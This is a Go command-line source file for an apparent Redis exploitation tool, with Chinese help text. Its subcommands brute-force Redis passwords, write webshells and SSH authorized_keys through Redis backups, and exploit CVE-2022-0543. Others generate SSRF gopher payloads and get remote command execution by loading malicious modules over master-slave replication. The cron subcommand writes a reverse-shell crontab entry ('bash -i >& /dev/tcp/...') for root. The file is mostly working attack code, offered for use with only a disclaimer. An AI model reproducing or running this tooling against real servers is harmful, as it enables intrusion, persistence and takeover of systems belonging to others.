package pkg

import (
	"fmt"
	"github.com/spf13/cobra"
	"os"
	"strings"
)

var (
	rhost, rport, lhost, lport, pwd string
	rpath, rfile, lfile             string
	command, user, webshell         string
	gbk                             bool
)

var rootCmd = &cobra.Command{
	Use:   "RedisExp",
	Short: "一款用于 Redis 漏洞的利用工具 [切勿非法测试，一切后果自负。]",
	Long:  ``,
	Run: func(cmd *cobra.Command, args []string) {
		err := Connect(rhost, rport, pwd)
		if err != nil {
			fmt.Println(err)
			return
		}
		RedisVersion()
	},
}

var cliCmd = &cobra.Command{
	Use:   "cli",
	Short: "执行 Redis 命令",
	Long:  "",
	Run: func(cmd *cobra.Command, args []string) {
		err := Connect(rhost, rport, pwd)
		if err != nil {
			fmt.Println(err)
			return
		}
		if !strings.EqualFold(command, "") {
			i, _ := RedisCmd(command)
			fmt.Println(i.(string))
			return
		}
		LoopRedis(rhost, rport)
	},
}

var bruteCmd = &cobra.Command{
	Use:   "brute",
	Short: "爆破密码",
	Long:  "",
	Run: func(cmd *cobra.Command, args []string) {
		if strings.EqualFold(rhost, "") || strings.EqualFold(pwd, "") {
			fmt.Println("参数错误: Redis.exe brute -r 目标IP -p 目标端口 -f 字典文件")
			return
		}
		BrutePWD(rhost, rport, pwd)
	},
}

var echoShellCmd = &cobra.Command{
	Use:   "shell",
	Short: "备份写 webshell",
	Long:  "",
	Run: func(cmd *cobra.Command, args []string) {
		err := Connect(rhost, rport, pwd)
		if err != nil {
			fmt.Println(err)
			return
		}
		if strings.EqualFold(rpath, "") || strings.EqualFold(rfile, "") || strings.EqualFold(webshell, "") {
			fmt.Println("参数错误: Redis.exe shell -r 目标IP -p 目标端口 -w 密码 -d 目标路径 -f 目标文件名 -s Webshell内容")
			return
		}
		if gbk {
			rpath = Utf8ToGbk(rpath)
		}

		EchoShell(rpath, rfile, webshell)
	},
}

var echoSshCmd = &cobra.Command{
	Use:   "ssh",
	Short: "备份写 ssh 密钥",
	Long:  "",
	Run: func(cmd *cobra.Command, args []string) {
		err := Connect(rhost, rport, pwd)
		if err != nil {
			fmt.Println(err)
			return
		}
		if strings.EqualFold(user, "") || strings.EqualFold(webshell, "") {
			fmt.Println("参数错误: Redis.exe ssh -r 目标IP -p 目标端口 -w 密码 -n 用户名 -s 公钥")
			return
		}

		if strings.EqualFold(user, "root") {
			user = "/root/.ssh/"
		} else if strings.Contains(user, "/") {

		} else {
			user = fmt.Sprintf("/home/%s/.ssh/", user)
		}

		EchoShell(user, "authorized_keys", webshell)
	},
}

var echoCrontabCmd = &cobra.Command{
	Use:   "cron",
	Short: "备份写 Linux 计划任务",
	Long:  "",
	Run: func(cmd *cobra.Command, args []string) {
		err := Connect(rhost, rport, pwd)
		if err != nil {
			fmt.Println(err)
			return
		}
		if strings.EqualFold(lhost, "") || strings.EqualFold(lport, "") {
			fmt.Println("参数错误: Redis.exe cron -r 目标IP -p 目标端口 -w 密码 -L VpsIP -P VpsPort")
			return
		}
		webshell = fmt.Sprintf("*/1 * * * * bash -i >& /dev/tcp/%s/%s 0>&1", lhost, lport)
		EchoShell("/var/spool/cron/", "root", webshell)
	},
}

var luaCmd = &cobra.Command{
	Use:   "lua",
	Short: "CVE-2022-0543",
	Long:  "",
	Run: func(cmd *cobra.Command, args []string) {
		err := Connect(rhost, rport, pwd)
		if err != nil {
			fmt.Println(err)
			return
		}
		if !strings.EqualFold(command, "") {
			RedisLua(command)
			return
		}

		LoopCVE()

	},
}

var gopherCmd = &cobra.Command{
	Use:   "gopher",
	Short: "生成 ssrf gopher payload",
	Long:  "",
	Run: func(cmd *cobra.Command, args []string) {
		if strings.EqualFold(lfile, "") {
			fmt.Println("参数错误: Redis.exe gopher -f 1.txt")
			return
		}
		i, err := ReadFile(lfile)
		if err != nil {
			fmt.Println(err)
			return
		}
		if strings.EqualFold(lhost, "") {
			lhost = "127.0.0.1"
		}
		Gopher(lhost+":"+lport, i)
	},
}

var rceCmd = &cobra.Command{
	Use:   "rce",
	Short: "主从复制执行命令",
	Long:  "",
	Run: func(cmd *cobra.Command, args []string) {
		err := Connect(rhost, rport, pwd)
		if err != nil {
			fmt.Println(err)
			return
		}
		if strings.EqualFold(lhost, "") {
			fmt.Println("参数错误: Redis.exe -r 目标IP -p 目标端口 -w 密码 -L 本地IP -P 本地Port [-c whoami 单次执行]")
			return
		}
		if gbk {
			rpath = Utf8ToGbk(rpath)
		}

		if strings.EqualFold(rfile, "") {
			rfile = "exp.dll"
		}

		RedisSlave(lhost, lport, rpath, rfile)
		if !strings.EqualFold(command, "") {
			RunCmd(command)
			CloseSlave(rfile)
			return
		}

		LoopCmd(rfile)
	},
}

var uploadCmd = &cobra.Command{
	Use:   "upload",
	Short: "主从复制上传文件",
	Long:  "",
	Run: func(cmd *cobra.Command, args []string) {
		err := Connect(rhost, rport, pwd)
		if err != nil {
			fmt.Println(err)
			return
		}
		if strings.EqualFold(lhost, "") || strings.EqualFold(rfile, "") || strings.EqualFold(lfile, "") {
			fmt.Println("参数错误: Redis.exe -r 目标IP -p 目标端口 -w 密码 -L 本地IP -P 本地Port -d 目标路径 -f 目标文件名 -F 本地文件")
			return
		}

		if gbk {
			rpath = Utf8ToGbk(rpath)
		}

		RedisUpload(lhost, lport, rpath, rfile, lfile)
	},
}

var closeCmd = &cobra.Command{
	Use:   "close",
	Short: "关闭主从复制",
	Long:  "",
	Run: func(cmd *cobra.Command, args []string) {
		err := Connect(rhost, rport, pwd)
		if err != nil {
			fmt.Println(err)
			return
		}
		CloseSlave(rfile)
	},
}

func init() {
	rootCmd.PersistentFlags().StringVarP(&rhost, "rhost", "r", "", "目标IP")
	rootCmd.PersistentFlags().StringVarP(&rport, "rport", "p", "6379", "目标端口")
	rootCmd.PersistentFlags().StringVarP(&pwd, "pwd", "w", "", "Password")
	rootCmd.PersistentFlags().BoolVarP(&gbk, "gbk", "g", false, "windows 中文路径设置")

	cliCmd.Flags().StringVarP(&command, "cmd", "c", "", "单次执行 Redis 命令")
	rootCmd.AddCommand(cliCmd)

	bruteCmd.Flags().StringVarP(&pwd, "dict", "f", "", "设置密码字典")
	rootCmd.AddCommand(bruteCmd)

	echoShellCmd.Flags().StringVarP(&rpath, "rpath", "d", "", "目标路径")
	echoShellCmd.Flags().StringVarP(&rfile, "rfile", "f", "", "目标文件名")
	echoShellCmd.Flags().StringVarP(&webshell, "data", "s", "", "webshell内容")
	rootCmd.AddCommand(echoShellCmd)

	echoSshCmd.Flags().StringVarP(&user, "user", "u", "", "输入 root 默认/root/.ssh/\\tkali 默认 /home/kali/.ssh/\\t可以自定义目录例如: /.ssh/")
	echoSshCmd.Flags().StringVarP(&webshell, "key", "s", "", "[id_rsa.pub] 公钥内容")
	rootCmd.AddCommand(echoSshCmd)

	echoCrontabCmd.Flags().StringVarP(&lhost, "lhost", "L", "", "反弹Shell IP")
	echoCrontabCmd.Flags().StringVarP(&lport, "lport", "P", "", "反弹Shell 端口")
	rootCmd.AddCommand(echoCrontabCmd)

	luaCmd.Flags().StringVarP(&command, "cmd", "c", "", "单次执行 CVE-2022-0543 命令")
	rootCmd.AddCommand(luaCmd)

	gopherCmd.Flags().StringVarP(&lhost, "lhost", "L", "", "本地IP")
	gopherCmd.Flags().StringVarP(&lport, "lport", "P", "6379", "本地端口")
	gopherCmd.Flags().StringVarP(&lfile, "lfile", "f", "", "gopher 模板文件")
	rootCmd.AddCommand(gopherCmd)

	rceCmd.Flags().StringVarP(&lhost, "lhost", "L", "", "本地IP")
	rceCmd.Flags().StringVarP(&lport, "lport", "P", "6379", "本地端口")
	rceCmd.Flags().StringVarP(&rpath, "rpath", "d", "./", "目标路径")
	rceCmd.Flags().StringVarP(&rfile, "rfile", "f", "exp.dll", "Windows(exp.dll) Linux需要设置(exp.so)")
	rceCmd.Flags().StringVarP(&command, "cmd", "c", "", "单次执行主从命令")
	rootCmd.AddCommand(rceCmd)

	uploadCmd.Flags().StringVarP(&lhost, "lhost", "L", "", "本地IP")
	uploadCmd.Flags().StringVarP(&lport, "lport", "P", "6379", "本地端口")
	uploadCmd.Flags().StringVarP(&rpath, "rpath", "d", "./", "目标路径")
	uploadCmd.Flags().StringVarP(&rfile, "rfile", "f", "", "目标文件名")
	uploadCmd.Flags().StringVarP(&lfile, "lfile", "F", "", "本地文件")
	rootCmd.AddCommand(uploadCmd)

	closeCmd.Flags().StringVarP(&rfile, "rfile", "f", "", "默认只关闭主从, 给个值会执行module unload system, Linux需要设置(exp.so) ")
	rootCmd.AddCommand(closeCmd)
}

func Execute() {

	if err := rootCmd.Execute(); err != nil {
		os.Exit(1)
	}
}
